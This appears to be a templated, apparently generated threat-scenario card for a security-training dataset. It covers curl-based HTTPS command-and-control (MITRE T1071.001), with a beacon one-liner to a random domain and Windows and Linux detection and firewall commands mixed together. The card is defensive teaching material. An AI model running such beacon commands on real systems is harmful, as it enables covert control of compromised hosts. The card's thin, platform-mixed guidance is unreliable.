---
type: campaign
scenario_id: 184
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with C2 server via HTTPS.

## Threat Description
Using curl to communicate with C2 server via HTTPS.

## Attack Command
```
curl -s -o /dev/null https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
```

## Detection Logic
Monitor curl HTTPS: `wmic process where name='curl.exe' get commandline | findstr https`; Monitor HTTPS traffic: `netstat -anp | grep :443`.

## Mitigation
Restrict curl: `icacls %programfiles%\Git\mingw64\bin\curl.exe /deny Everyone:RX`; Block HTTPS C2: `netsh advfirewall firewall add rule name='Block curl HTTPS' dir=out program='%programfiles%\Git\mingw64\bin\curl.exe' action=block`.

## AI Training Prompt
Train AI to detect curl HTTPS C2 and suggest firewall rules.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
